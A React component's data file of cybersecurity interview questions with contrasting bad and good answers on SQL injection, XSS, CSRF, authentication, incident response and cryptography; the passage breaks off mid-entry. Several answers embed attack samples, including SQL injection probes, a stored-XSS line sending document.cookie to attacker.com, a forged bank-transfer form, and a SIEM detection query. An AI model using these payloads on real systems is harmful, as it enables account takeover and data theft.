import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Input } from "@/components/ui/input";
import { motion, AnimatePresence } from "framer-motion";
import {
    MessageSquare,
    CheckCircle2,
    XCircle,
    Lightbulb,
    TrendingUp,
    Target,
    Shield,
    Code,
    Network,
    Lock,
    Users,
    AlertTriangle,
    BookOpen,
    Search,
    Star,
    Brain,
    Award,
    Clock,
    Filter,
    ChevronDown,
    ChevronUp,
    Bookmark,
    Share2,
    Copy
} from "lucide-react";

interface InterviewQuestion {
    id: string;
    category: "Technical" | "Behavioral" | "Scenario" | "Explaining Concepts";
    difficulty: "Junior" | "Mid-Level" | "Senior";
    question: string;
    badAnswer: string;
    badReasons: string[];
    goodAnswer: string;
    goodReasons: string[];
    tips: string[];
    relatedTopics: string[];
}

const interviewQuestions: InterviewQuestion[] = [
    // SQL Injection Questions
    {
        id: "sql-01",
        category: "Explaining Concepts",
        difficulty: "Junior",
        question: "Explain SQL injection to a non-technical person (CEO, manager, or your grandmother)",
        badAnswer: "SQL injection is when an attacker concatenates malicious SQL syntax into user input fields, exploiting insufficient input sanitization to execute arbitrary database commands.",
        badReasons: [
            "Uses technical jargon (concatenates, syntax, sanitization)",
            "Doesn't explain the actual impact",
            "Audience won't understand 'arbitrary database commands'",
            "No real-world analogy or context"
        ],
        goodAnswer: "Imagine you have a form asking 'What's your name?' You expect someone to type 'John', but an attacker types special commands that trick the system into doing more than just storing a name. It's like if someone gave extra instructions to a bank teller that made them withdraw money from everyone's accounts instead of just their own. SQL injection tricks databases into revealing or modifying data they shouldn't have access to. The fix is simple and free - it's like using a form with locked fields where you can only fill in actual names, not add extra commands.",
        goodReasons: [
            "Uses familiar analogy (bank teller)",
            "Explains impact in business terms (data theft, modification)",
            "No technical jargon, accessible language",
            "Mentions the fix is simple, reassuring to management",
            "Shows consequences they care about"
        ],
        tips: [
            "Always use analogies for non-technical audiences",
            "Focus on business impact, not technical details",
            "Keep it under 60 seconds",
            "End with a positive note about fixes being available"
        ],
        relatedTopics: ["SQL Injection", "Input Validation", "Prepared Statements"]
    },
    {
        id: "sql-02",
        category: "Technical",
        difficulty: "Junior",
        question: "How would you test a web application for SQL injection vulnerabilities?",
        badAnswer: "Run SQLMap",
        badReasons: [
            "Only mentions tools, not methodology",
            "Doesn't show understanding of the vulnerability",
            "No manual testing mentioned",
            "Doesn't follow professional pentesting workflow"
        ],
        goodAnswer: "I'd start with manual testing before automation. First, I'd insert a single quote (') in input fields to see if it triggers database errors - that indicates potential SQL injection. Then I'd test boolean-based injection with payloads like ' OR '1'='1 to see if I can manipulate query logic. I'd try comment syntax (--) to bypass parts of the query. If errors reveal database type, I'd tailor my approach. Once confirmed, I'd use SQLMap with appropriate flags like -u for the URL and --risk and --level parameters for deeper testing. Manual testing first ensures I understand the vulnerability mechanics, not just rely on tools. I'd document all findings with severity ratings and proof-of-concept screenshots.",
        goodReasons: [
            "Shows methodical approach (manual first, automated second)",
            "Demonstrates understanding of SQL injection types",
            "Mentions specific techniques and payloads",
            "Explains reasoning behind the approach",
            "Includes documentation and reporting",
            "Shows professional pentesting workflow"
        ],
        tips: [
            "Always mention manual testing before automation",
            "Explain your thought process, not just the steps",
            "Show knowledge of different injection types",
            "Mention documentation and responsible disclosure"
        ],
        relatedTopics: ["SQL Injection", "Manual Testing", "SQLMap", "Methodology"]
    },
    {
        id: "sql-03",
        category: "Scenario",
        difficulty: "Mid-Level",
        question: "You find SQL injection on a client's production website. Walk me through your next steps.",
        badAnswer: "Dump the database and show them all the customer data I extracted to prove it's serious.",
        badReasons: [
            "Unethical - exceeds authorized scope",
            "Could cause legal issues",
            "Damages trust with client",
            "Risks real customer data exposure",
            "No professional reporting process mentioned"
        ],
        goodAnswer: "First, I'd immediately stop testing and verify the vulnerability with a safe proof-of-concept - like extracting the database version or running a simple SELECT statement that doesn't touch actual customer data. I'd document the exact URL, parameters, HTTP request showing the vulnerability, and any database error messages. Then I'd report it to the client through proper channels (bug bounty portal or security@company email) with: 1) Executive summary explaining business risk in non-technical terms, 2) Technical details for their developers including exact payloads used, 3) CVSS severity score (likely 9.0+ for data exposure), 4) Remediation steps (use parameterized queries/prepared statements), 5) Estimated fix time (2-4 hours for a developer). I'd never exceed my authorized scope - ethical hacking means respecting boundaries even when you could go further. Finally, I'd offer to retest after they've patched.",
        goodReasons: [
            "Emphasizes ethical boundaries and authorization",
            "Uses safe PoC without touching real data",
            "Professional multi-stakeholder reporting",
            "Provides business context and technical details",
            "Offers constructive remediation guidance",
            "Shows maturity and trustworthiness"
        ],
        tips: [
            "ALWAYS stay within authorized scope",
            "Safe PoC only - never extract real customer data",
            "Report immediately, don't sit on critical vulns",
            "Provide both technical and business context",
            "Be constructive, not just critical"
        ],
        relatedTopics: ["Ethics", "Responsible Disclosure", "Reporting", "Authorization"]
    },

    // XSS Questions
    {
        id: "xss-01",
        category: "Explaining Concepts",
        difficulty: "Junior",
        question: "What is XSS and why is it dangerous? It's just an alert box, right?",
        badAnswer: "XSS stands for Cross-Site Scripting. It allows JavaScript execution in the browser. It can show alert boxes.",
        badReasons: [
            "Dismissive of severity ('just an alert box')",
            "Doesn't explain real-world impact",
            "No mention of what attackers actually do with XSS",
            "Lacks concrete examples"
        ],
        goodAnswer: "XSS is dangerous precisely because people think it's 'just an alert box.' The alert is proof-of-concept, but real attacks are much worse. Once an attacker can inject JavaScript, they can: 1) Steal session cookies and hijack your account (no password needed), 2) Capture everything you type including credit cards and passwords (keylogging), 3) Modify what you see on the page to phish credentials (fake login forms), 4) Use your browser to attack other users (self-propagating worm), 5) Mine cryptocurrency using your computer. In 2018, British Airways suffered an XSS attack that stole 380,000 credit cards, resulting in a £183 million fine. The alert box is like demonstrating you can unlock a door - the real question is what someone could steal once inside.",
        goodReasons: [
            "Addresses the misconception directly",
            "Lists specific attack scenarios",
            "Provides real-world breach example with costs",
            "Uses effective analogy (unlocking a door)",
            "Shows XSS leads to serious business impact"
        ],
        tips: [
            "Always counter the 'just an alert box' misconception",
            "List concrete attack scenarios",
            "Use recent breach examples",
            "Explain the attack chain (XSS → cookie theft → account takeover)"
        ],
        relatedTopics: ["XSS", "Session Hijacking", "Cookie Theft", "British Airways Breach"]
    },
    {
        id: "xss-02",
        category: "Technical",
        difficulty: "Mid-Level",
        question: "What's the difference between reflected, stored, and DOM-based XSS?",
        badAnswer: "Reflected is in the URL, stored is in the database, DOM is in JavaScript.",
        badReasons: [
            "Oversimplified and partially incorrect",
            "Doesn't explain impact differences",
            "No mention of persistence or severity",
            "Missing key exploitation details"
        ],
        goodAnswer: "Reflected XSS: The malicious script is reflected off the server in the response immediately. Attack requires tricking the victim into clicking a malicious link (e.g., via phishing). Not persistent - only affects that one user's session. Example: search?q=<script>alert(1)</script>. Severity: Medium (requires social engineering). Stored XSS: The malicious script is permanently stored on the server (database, forum post, comment). Every user who views that page executes the script - no social engineering needed. Most dangerous type. Example: forum comment with <script>fetch('attacker.com?cookie='+document.cookie)</script>. Severity: High/Critical (affects all users). DOM-Based XSS: Vulnerability is entirely client-side - the server isn't involved. JavaScript code processes user input without sanitization. Example: innerHTML=location.hash where attacker controls the hash. Detected by code review, not traditional scanners. Severity: Medium to High depending on exploitability.",
        goodReasons: [
            "Clear definitions with distinctions",
            "Explains severity and impact differences",
            "Provides concrete code examples",
            "Mentions exploitation requirements",
            "Notes detection methods"
        ],
        tips: [
            "Use the severity + social engineering angle to differentiate",
            "Stored XSS is always more severe (affects all users)",
            "Mention that DOM XSS needs code review to find",
            "Provide specific payload examples"
        ],
        relatedTopics: ["XSS Types", "Persistence", "Client-Side vs Server-Side"]
    },

    // Authentication & Authorization Questions
    {
        id: "auth-01",
        category: "Technical",
        difficulty: "Mid-Level",
        question: "What's the difference between authentication and authorization? Why does it matter?",
        badAnswer: "Authentication is login, authorization is permissions.",
        badReasons: [
            "Too brief, lacks depth",
            "Doesn't explain why distinction matters",
            "No security implications mentioned",
            "Missing real-world attack examples"
        ],
        goodAnswer: "Authentication answers 'Who are you?' - proving your identity (username/password, biometrics, MFA). Authorization answers 'What can you do?' - defining permissions after you're authenticated. The distinction matters because they're separate security controls that can fail independently. Broken authentication means attackers can impersonate users (credential stuffing, brute force, session hijacking). Broken authorization means authenticated users can access resources they shouldn't (IDOR, privilege escalation, missing access controls). Example: You're authenticated as a regular user (authentication works), but you can access admin functions by changing a URL parameter (authorization fails). The Facebook Cambridge Analytica scandal was broken authorization - authenticated apps accessed data beyond their permissions. Both are in OWASP Top 10: A01 (Broken Access Control/Authorization) and A07 (Authentication Failures).",
        goodReasons: [
            "Clear 'who vs what' framework",
            "Explains independent failure modes",
            "Provides specific attack examples for each",
            "Real-world breach context (Facebook)",
            "Links to OWASP Top 10 framework"
        ],
        tips: [
            "Use the 'Who vs What' framework",
            "Emphasize they fail independently",
            "Authentication bugs: credential attacks",
            "Authorization bugs: access control bypasses"
        ],
        relatedTopics: ["Authentication", "Authorization", "OWASP Top 10", "Access Control"]
    },
    {
        id: "auth-02",
        category: "Scenario",
        difficulty: "Senior",
        question: "Design a secure authentication system for a banking application. What controls would you implement?",
        badAnswer: "Use bcrypt for passwords, add MFA, and use HTTPS.",
        badReasons: [
            "Too basic for a senior-level question",
            "Missing many critical components",
            "No mention of threat modeling",
            "Doesn't address session management, monitoring, or recovery flows"
        ],
        goodAnswer: "I'd design with defense-in-depth and assume breach: **1) Password Security**: Bcrypt/Argon2 with high work factors, minimum 12 chars, check against Have I Been Pwned database, prevent common passwords (top 10k list). **2) MFA**: TOTP (not SMS - SIM swapping risk), with backup codes securely stored. **3) Session Management**: Short-lived JWT access tokens (15 min), longer refresh tokens (httpOnly, secure, sameSite cookies), rotate on refresh, invalidate on logout. **4) Brute Force Protection**: Rate limiting (5 failed attempts = 15min lockout), progressive delays, CAPTCHA after 3 failures. **5) Monitoring**: Log all auth events, alert on: multiple failures, logins from new IPs/devices, concurrent sessions, unusual hours. **6) Account Recovery**: Security questions (3 minimum), email + SMS verification, time-delayed password resets (4-hour window before taking effect). **7) Device Fingerprinting**: Track known devices, require additional verification for new ones. **8) Secure Communication**: TLS 1.3 only, HSTS, certificate pinning for mobile apps. **9) Zero Trust**: Re-authenticate for sensitive operations (wire transfers), even mid-session. This layered approach means compromise of one control doesn't collapse the entire system.",
        goodReasons: [
            "Comprehensive, touches all critical areas",
            "Defense-in-depth philosophy stated upfront",
            "Specific technologies and parameters (not just buzzwords)",
            "Considers various attack vectors",
            "Monitoring and incident response included",
            "Demonstrates senior-level thinking"
        ],
        tips: [
            "Senior questions need comprehensive, architected answers",
            "Show defense-in-depth thinking",
            "Mention specific technologies and why",
            "Include monitoring/alerting - often forgotten",
            "Consider the entire lifecycle (registration, login, recovery, session)"
        ],
        relatedTopics: ["Authentication", "Authorization", "Defense in Depth", "Session Management"]
    },

    // Network Security Questions
    {
        id: "network-01",
        category: "Technical",
        difficulty: "Junior",
        question: "Explain what a port scan is and why attackers do it.",
        badAnswer: "Port scanning checks which ports are open on a system using tools like Nmap.",
        badReasons: [
            "Doesn't explain why ports matter",
            "No context about what attackers learn",
            "Missing the 'so what' factor",
            "Doesn't relate to attack lifecycle"
        ],
        goodAnswer: "Port scanning is like checking which doors and windows of a building are unlocked before attempting entry. Each port (0-65535) represents a service - port 22 is SSH, 80 is HTTP, 3306 is MySQL, etc. When attackers scan your network, they're asking: 'What services are running? What versions? Are there known vulnerabilities?' This is the reconnaissance phase before actual attacks. For example, finding port 22 open with an old SSH version might mean it's vulnerable to specific exploits. Finding port 3306 (MySQL) exposed to the internet is a critical misconfiguration - databases should be internal-only. Port scanning tells attackers your attack surface - every open port is a potential entry point. Defense: Use firewalls to close unnecessary ports, run services on non-standard ports (security by obscurity is weak but adds a layer), monitor for scan attempts (IDS/IPS), implement rate limiting.",
        goodReasons: [
            "Uses effective building analogy",
            "Explains what attackers learn from results",
            "Links to attack lifecycle (reconnaissance → exploitation)",
            "Provides specific port examples with context",
            "Includes defensive measures"
        ],
        tips: [
            "Connect scanning to the broader attack chain",
            "Mention specific ports and their services",
            "Explain what information is gained",
            "Include both offensive and defensive perspectives"
        ],
        relatedTopics: ["Port Scanning", "Reconnaissance", "Nmap", "Attack Surface"]
    },
    {
        id: "network-02",
        category: "Scenario",
        difficulty: "Mid-Level",
        question: "You're hired to pentest a company. Describe your methodology from start to finish.",
        badAnswer: "First I'd do reconnaissance, then vulnerability scanning, then exploitation, then write a report.",
        badReasons: [
            "Too vague and generic",
            "No specific techniques or tools mentioned",
            "Missing key phases (permission, post-exploitation)",
            "Doesn't show deep understanding of process"
        ],
        goodAnswer: "**Phase 0: Pre-Engagement**: Get signed authorization (Rules of Engagement), define scope (IP ranges, domains), testing windows, communication channels, emergency contacts. This protects me legally. **Phase 1: Reconnaissance**: Passive OSINT (Google dorking, Shodan, social media, WHOIS, LinkedIn for employee emails), Active scanning (Nmap for ports/services, subdomain enumeration, technology fingerprinting). Build attack surface map. **Phase 2: Vulnerability Assessment**: Automated scanning (Nessus, OpenVAS), manual testing for OWASP Top 10, check for default credentials, outdated software (CVE databases), misconfigurations. Prioritize by CVSS score. **Phase 3: Exploitation**: Prove vulnerabilities are real (PoC), gain initial access (Metasploit, custom exploits), document all steps with screenshots. **Phase 4: Post-Exploitation**: Privilege escalation (Linux: sudo, SUID; Windows: registry, services), lateral movement, persistence mechanisms (for continuous assessment), data discovery (don't exfiltrate - just document location). **Phase 5: Reporting**: Executive summary (business risk), technical details (every vuln with steps to reproduce), remediation prioritization (critical first), retest timeline. **Phase 6: Debrief**: Present findings, answer questions, support remediation efforts, retest after fixes.",
        goodReasons: [
            "Comprehensive 7-phase methodology",
            "Emphasizes legal authorization upfront",
            "Specific tools and techniques for each phase",
            "Distinguishes passive vs active reconnaissance",
            "Includes post-exploitation (often missed)",
            "Strong reporting and follow-up",
            "Shows professional maturity"
        ],
        tips: [
            "ALWAYS mention authorization/legal first",
            "Break methodology into clear phases",
            "Name specific tools and techniques",
            "Include reporting and retest",
            "Post-exploitation is often forgotten - mention it"
        ],
        relatedTopics: ["Pentesting Methodology", "Kill Chain", "Reconnaissance", "Reporting"]
    },

    // Blue Team / Defense Questions
    {
        id: "blue-01",
        category: "Technical",
        difficulty: "Mid-Level",
        question: "How would you detect a SQL injection attack as a blue team defender?",
        badAnswer: "Look for SQL keywords in logs.",
        badReasons: [
            "Too simplistic",
            "Easily bypassed (encoding, obfuscation)",
            "No mention of SIEM, IDS, or detection tools",
            "Missing context about where to look"
        ],
        goodAnswer: "Multi-layered detection: **1) Web Application Firewall (WAF)**: Rules detecting SQL metacharacters (', --, UNION, SELECT) in requests, blocks and alerts. **2) SIEM Queries**: Splunk/ELK searching for: Database errors in web logs (500 errors with SQL syntax messages), Unusual query patterns (UNION SELECT, OR 1=1, time delays), High volume of queries from single IP, Query length anomalies (10x normal). **3) Database Activity Monitoring**: Alert on: Multiple failed queries from application, Queries accessing unusual tables, SELECT statements with no WHERE clause, Information_schema access attempts. **4) Application Logging**: Log all database queries with parameters, Monitor for escaped quotes or SQL keywords in user input. **5) Baseline Deviation**: ML models detecting query patterns that deviate from normal (e.g., suddenly accessing all user records). **6) Honeytokens**: Fake database fields that should never be accessed - if queried, it's an attack. Example SIEM query: `sourcetype=web_access (status=500 OR status=200) AND (sql_error=* OR body=\"*' OR*\" OR body=\"*UNION*\")`. The key is correlation - one indicator might be noise, but multiple indicators together = incident.",
        goodReasons: [
            "Defense-in-depth approach (multiple detection layers)",
            "Specific tools and technologies",
            "Concrete SIEM query example",
            "Mentions evasion techniques",
            "Includes proactive measures (honeytokens)",
            "Emphasizes correlation over single indicators"
        ],
        tips: [
            "Blue team questions need layered defense answers",
            "Mention specific tools (SIEM, WAF, IDS)",
            "Provide actual detection rules or queries",
            "Consider both signature-based and anomaly-based detection"
        ],
        relatedTopics: ["Blue Team", "SIEM", "WAF", "Detection Engineering"]
    },
    {
        id: "blue-02",
        category: "Scenario",
        difficulty: "Senior",
        question: "Your SIEM alerts show 10,000 failed SSH login attempts from 50 IPs over the last hour. Walk me through your incident response process.",
        badAnswer: "Block all the IPs in the firewall.",
        badReasons: [
            "Knee-jerk reaction without analysis",
            "Doesn't follow IR framework",
            "No triage or investigation mentioned",
            "Could be blocking legitimate traffic",
            "Missing containment, eradication, recovery phases"
        ],
        goodAnswer: "**1) Initial Triage (5 min)**: Verify alert isn't false positive, check if any logins succeeded (failed attempts are expected, success = breach), identify targeted accounts (root? specific users?), check if IPs are known (Tor exits? VPN providers? Specific countries?). **2) Immediate Containment (if breach confirmed)**: If successful logins found: Invalidate all SSH sessions from those accounts, Reset compromised account passwords, Enable MFA if not already active. **3) Investigation (30 min)**: Analyze attack pattern: Distributed (botnet) or coordinated? Brute force (trying passwords) or credential stuffing (using leaked passwords)? Target: Production servers or all systems? Check logs for: What accounts were targeted most, Time-based patterns (sustained vs burst), Success/failure ratio (indicates password strength), Check compromised account's activity if breach occurred. **4) Tactical Response**: Temporary: Rate limit SSH (5 attempts = 15min ban per IP), Geo-block if attacks from specific countries, Enable CAPTCHA for SSH (fail2ban). Permanent: Enforce key-based auth (disable passwords), Change SSH port (obscurity, not security), Implement jump boxes for internal access. **5) Threat Hunting**: Search for: Lateral movement attempts, New user accounts created, Privilege escalation attempts, Data exfiltration (large outbound transfers). **6) Documentation**: Timeline, IOCs (IP addresses, user agents), Actions taken, Lessons learned. **7) Post-Incident**: Update runbooks, Tune SIEM rules (threshold too sensitive?), Train team on findings. Key insight: 10k failed attempts are noise - focus on successful logins. Attackers expect 99.9% failure rate in brute force.",
        goodReasons: [
            "Follows NIST IR framework (Triage → Contain → Investigate → Eradicate → Recover → Lessons Learned)",
            "Prioritizes correctly (successful logins, not failed attempts)",
            "Distinguishes tactical vs strategic response",
            "Includes threat hunting beyond initial alert",
            "Documentation and continuous improvement",
            "Realistic timelines provided",
            "Shows senior-level incident response maturity"
        ],
        tips: [
            "Senior questions require structured IR frameworks",
            "Triage FIRST - don't jump to conclusions",
            "Successful logins >> failed attempts in severity",
            "Include threat hunting and documentation",
            "Mention lessons learned and prevention"
        ],
        relatedTopics: ["Incident Response", "SIEM", "Brute Force Attacks", "SSH Security"]
    },

    // Behavioral Questions
    {
        id: "behavioral-01",
        category: "Behavioral",
        difficulty: "Mid-Level",
        question: "Describe a time you found a critical vulnerability. How did you handle it?",
        badAnswer: "I found SQL injection on a client site and immediately reported it. They fixed it.",
        badReasons: [
            "Too brief, no storytelling",
            "Doesn't show problem-solving process",
            "Missing the STAR method (Situation, Task, Action, Result)",
            "No lessons learned or growth demonstrated"
        ],
        goodAnswer: "**Situation**: During a bug bounty assessment of a financial platform, I was testing the account settings page when I noticed the user_id parameter wasn't properly validated. **Task**: My goal was to determine if this was a simple display issue or a critical security flaw that could expose other users' data. **Action**: I tested by incrementing the user_id parameter from 1001 (my account) to 1002. The page loaded successfully, displaying another user's full name, email, account balance, and recent transactions - clear IDOR vulnerability with PII exposure. Instead of continuing to test (which would risk legal issues and violate responsible disclosure), I immediately: 1) Documented the exact steps with sanitized screenshots (blurred sensitive data), 2) Assessed severity (CVSS 8.5 - High: unauthorized access to financial data), 3) Checked if it was already reported in their bug bounty program, 4) Submitted through official channels with: PoC video, business impact analysis (GDPR violation, potential for account takeover if combined with session hijacking), remediation steps (implement server-side authorization checks, user session validation). **Result**: The company acknowledged within 2 hours (weekend, but they had on-call security), patched within 8 hours, paid $5,000 bounty, and invited me to their private program. **Lessons Learned**: 1) Even simple parameter tampering can lead to critical vulnerabilities, 2) Clear communication with business impact gets faster response, 3) Ethical boundaries matter - I could have extracted more data but didn't. This experience taught me that responsible disclosure builds long-term relationships more valuable than quick payouts.",
        goodReasons: [
            "Follows STAR framework (Situation-Task-Action-Result)",
            "Shows technical skill (IDOR identification)",
            "Demonstrates ethical boundaries and responsible disclosure",
            "Quantifiable outcome ($5k bounty, 8hr fix time)",
            "Includes lessons learned (shows growth mindset)",
            "Business impact communication",
            "Tells a story, memorable for interviewer"
        ],
        tips: [
            "Use STAR method for all behavioral questions",
            "Emphasize ethical behavior and boundaries",
            "Include specific technical details",
            "Quantify results (dollars, time, users impacted)",
            "Always end with lessons learned"
        ],
        relatedTopics: ["IDOR", "Responsible Disclosure", "Bug Bounty", "Ethics"]
    },
    {
        id: "behavioral-02",
        category: "Behavioral",
        difficulty: "Senior",
        question: "Tell me about a time you made a mistake that impacted a project or client. How did you handle it?",
        badAnswer: "I accidentally deleted some data during testing, but I restored it from backup so no big deal.",
        badReasons: [
            "Downplays severity ('no big deal')",
            "Doesn't show accountability or ownership",
            "Missing lessons learned and process improvements",
            "No mention of communication with stakeholders"
        ],
        goodAnswer: "**Situation**: I was conducting a penetration test for an e-commerce client, focused on payment processing vulnerabilities. **Mistake**: While testing SQL injection on a product search feature, I used an aggressive automated scan without properly reviewing the payloads. One payload triggered a race condition that locked the production database, taking down the site for 14 minutes during peak shopping hours (6pm Friday). **Immediate Response**: 1) Immediately stopped all testing, 2) Notified the client's technical lead and my project manager within 60 seconds, 3) Offered to help their DBA troubleshoot (they declined - had it handled), 4) Documented exactly which payload caused the issue. **Accountability**: I took full responsibility in a call with their CTO and my director. No excuses about tool behavior - I should have reviewed every payload before running automated scans. I estimated they lost approximately $15k in sales during that window. **Remediation**: 1) Created incident timeline and root cause analysis, 2) Implemented new policy: Review all automated scan configurations, Run scans on staging first (when available), Use rate limiting on aggressive tests, Have client's technical team on standby before intensive testing. **Result**: Client was frustrated but appreciated transparency and immediate notification. They completed the engagement and hired us again 6 months later specifically because 'you owned the mistake and fixed your process.' I now train junior pentesters on this incident as a case study. **Lessons Learned**: Automation is powerful but dangerous - human oversight is mandatory. Trust is built through how you handle failures, not just successes. Communication speed during incidents matters more than technical skill.",
        goodReasons: [
            "Shows genuine vulnerability and accountability",
            "Quantifies impact honestly ($15k loss)",
            "Immediate action and stakeholder communication",
            "Process improvements implemented (not just apologizing)",
            "Long-term relationship salvaged through transparency",
            "Uses failure as teaching opportunity",
            "Demonstrates senior-level maturity and growth"
        ],
        tips: [
            "Don't pick trivial mistakes - show real stakes",
            "Own it completely, no excuses or blame-shifting",
            "Focus on what you learned and how you improved",
            "Show how the mistake made you better",
            "Senior candidates MUST show they learn from failures"
        ],
        relatedTopics: ["Professional Growth", "Accountability", "Risk Management", "Process Improvement"]
    },

    // Career & Industry Questions
    {
        id: "career-01",
        category: "Behavioral",
        difficulty: "Junior",
        question: "How do you stay updated on new vulnerabilities and security research?",
        badAnswer: "I read Twitter and watch YouTube videos.",
        badReasons: [
            "Too vague and passive",
            "No specific sources or structured approach",
            "Doesn't show dedicated effort",
            "Missing hands-on practice element"
        ],
        goodAnswer: "I use a multi-source approach: **Daily** (15 min): Twitter security researchers I follow (@orange_8361 for web vulnerabilities, @LiveOverflow for reverse engineering, @GossiTheDog for threat intel), HackerNews for discussions, Reddit r/netsec for community posts. **Weekly** (1 hour): CVE databases (NIST NVD filtered by critical/high), Security newsletters (tl;dr sec, Krebs on Security), HackerOne/Bugcrowd disclosed reports (learn from others' findings), GitHub security advisories for frameworks I use. **Monthly** (4 hours): DEF CON/Black Hat talk recordings (focus on tools and techniques), Security conference publications, Read research papers on specific interests (currently web app security). **Continuous Hands-On**: HackTheBox weekly challenges (maintain Hacker rank), TryHackMe for structured learning paths, Replicate new exploits in home lab to understand mechanics, Contribute to OWASP projects. **Knowledge Management**: Obsidian notes with tags for quick reference, Personal vulnerability database with PoCs, Blog posts to reinforce learning (Feynman technique). This isn't just consumption - I actively practice and document. When Log4Shell dropped, I had a vulnerable test environment running within 2 hours because I maintain a practice infrastructure.",
        goodReasons: [
            "Structured and specific approach",
            "Named sources and researchers",
            "Mix of passive (reading) and active (hands-on) learning",
            "Shows dedication with time commitments",
            "Knowledge management system mentioned",
            "Real example (Log4Shell) showing application",
            "Continuous improvement mindset"
        ],
        tips: [
            "Name specific sources and people you follow",
            "Show both learning and practicing",
            "Mention a knowledge management system",
            "Give time commitments to show seriousness",
            "Include recent example of applying new knowledge"
        ],
        relatedTopics: ["Continuous Learning", "Security Research", "CVEs", "Community Engagement"]
    },

    // Cryptography Questions
    {
        id: "crypto-01",
        category: "Technical",
        difficulty: "Mid-Level",
        question: "Explain the difference between encryption and hashing. When would you use each?",
        badAnswer: "Encryption scrambles data, hashing makes it secure. Both are for security.",
        badReasons: [
            "Imprecise definitions",
            "No mention of reversibility",
            "Missing use cases",
            "Doesn't explain fundamental difference"
        ],
        goodAnswer: "**Encryption** is reversible - you can get the original data back with the correct key. It's two-way: plaintext → ciphertext → plaintext. Use for: protecting data in transit (HTTPS/TLS), data at rest (encrypted drives), secure messaging. Examples: AES-256 for file encryption, RSA for key exchange. **Hashing** is one-way - you cannot reverse it to get original data. Same input always produces same output (deterministic), but even tiny changes create completely different hash. Use for: password storage (never store passwords, only hashes), file integrity verification (checksums), digital signatures, blockchain. Examples: SHA-256 for file verification, bcrypt/Argon2 for passwords. Key Difference: If you need the data back, use encryption. If you only need to verify/compare, use hashing. Real-world example: Password login: Hash the entered password and compare to stored hash. Credit card storage: Encrypt card numbers so payment processor can decrypt them. Common mistake: Using MD5 or SHA-1 for passwords (too fast, vulnerable to rainbow tables) - always use purpose-built password hashing algorithms with salt and high work factors.",
        goodReasons: [
            "Clear distinction: reversible vs one-way",
            "Specific use cases for each",
            "Named algorithms with purposes",
            "Explains common mistakes",
            "Real-world examples (login, payment)",
            "Mentions salt and work factors for passwords"
        ],
        tips: [
            "Emphasize reversibility as the key difference",
            "Use concrete examples for both",
            "Mention common misuse (MD5 for passwords)",
            "Know when to use each"
        ],
        relatedTopics: ["Cryptography", "Hashing", "Encryption", "Password Security"]
    },
    {
        id: "crypto-02",
        category: "Scenario",
        difficulty: "Senior",
        question: "A company asks you to review their encryption strategy. They're using AES-128 for file encryption, MD5 for file integrity, and storing encrypted files with keys in the same database. What would you recommend?",
        badAnswer: "Switch to AES-256 and use SHA-256 instead of MD5.",
        badReasons: [
            "Misses the critical vulnerability (key storage)",
            "Doesn't prioritize issues by severity",
            "AES-128 is actually fine for most use cases",
            "No explanation of why recommendations matter"
        ],
        goodAnswer: "**Critical Issue (Fix Immediately)**: Keys stored with encrypted data. This is like locking your door but leaving the key in the lock. If an attacker breaches the database, they get both ciphertext and keys - encryption is useless. **Recommendation**: Implement proper key management: Use HSM (Hardware Security Module) for production, Key Management Service (AWS KMS, Azure Key Vault, Google KMS) for cloud, At minimum: store keys on separate server with strict access controls. Never commit keys to Git. **High Priority**: MD5 for integrity is broken (collision attacks since 2008). Attacker can create modified file with same MD5 hash. **Recommendation**: Switch to SHA-256 minimum, SHA-3 preferred. Use HMAC for authenticated integrity. **Low Priority**: AES-128 is actually sufficient for most commercial use (not broken, 2^128 combinations). AES-256 is better but not urgent. **Recommendation**: Plan migration to AES-256 during next security refresh, not immediate. **Additional Recommendations**: 1) Implement key rotation policy (90 days for sensitive data), 2) Use authenticated encryption (AES-GCM instead of AES-CBC alone - prevents tampering), 3) Document encryption key recovery process for disasters, 4) Audit who has access to encryption keys (principle of least privilege). **Priority Order**: Key storage (critical vulnerability) → Hash algorithm (broken security) → AES key size (future-proofing). Fix severity: 10/10 → 8/10 → 4/10.",
        goodReasons: [
            "Identifies the critical vulnerability first (key storage)",
            "Prioritizes by severity, not just listing issues",
            "Explains why each issue matters",
            "Provides specific, actionable recommendations",
            "Includes both immediate fixes and long-term improvements",
            "Mentions key rotation and access control",
            "Shows senior-level strategic thinking"
        ],
        tips: [
            "Always prioritize by severity/urgency",
            "Key management is often the weakest point",
            "Explain business impact, not just technical flaws",
            "Provide both quick wins and long-term roadmap",
            "Senior questions need comprehensive answers"
        ],
        relatedTopics: ["Cryptography", "Key Management", "AES", "Hash Functions", "Security Architecture"]
    },

    // Web Application Security - Advanced
    {
        id: "webapp-01",
        category: "Technical",
        difficulty: "Mid-Level",
        question: "Explain CSRF (Cross-Site Request Forgery) and how anti-CSRF tokens prevent it.",
        badAnswer: "CSRF is when an attacker makes requests on behalf of a user. Tokens prevent this.",
        badReasons: [
            "Doesn't explain how the attack works",
            "No example attack scenario",
            "Doesn't explain why tokens are effective",
            "Missing alternative defenses"
        ],
        goodAnswer: "**CSRF Attack Mechanics**: A victim is logged into site A (bank.com). Attacker tricks victim into visiting attacker's site (evil.com). Evil.com contains hidden form: `<form action='https://bank.com/transfer' method='POST'><input name='to' value='attacker'/><input name='amount' value='10000'/></form>` with auto-submit JavaScript. Victim's browser automatically includes their bank.com cookies (session token) with the request - browser can't tell it's a cross-site attack. Bank.com processes legitimate-looking request because session is valid. Result: Money transferred without victim's knowledge. **Why Tokens Work**: Server generates unique, unpredictable token per session/request. Token stored in hidden form field AND session. On submission, server compares: form token === session token. Attacker's site can't read victim's bank.com token (Same-Origin Policy blocks this), so forged requests fail validation. **Implementation**: Generate: cryptographically random token (128+ bits), Store: server-side session + hidden form field, Validate: every state-changing request (POST, PUT, DELETE), Reject: if token missing or mismatched. **Alternative Defenses**: SameSite cookie attribute (blocks cross-site requests), Double-submit cookies (token in cookie + form), Check Referer header (weak, easily bypassed), Re-authentication for sensitive actions. **Example**: Django uses {% csrf_token %} template tag, generates new token per session. **Common Mistake**: Only protecting POST requests - GET should never change state (REST principle), but many apps violate this.",
        goodReasons: [
            "Step-by-step attack scenario with HTML",
            "Explains browser cookie behavior",
            "Details why tokens work (Same-Origin Policy)",
            "Implementation specifics (generation, storage, validation)",
            "Lists multiple defense options",
            "Mentions common mistakes",
            "Framework example (Django)"
        ],
        tips: [
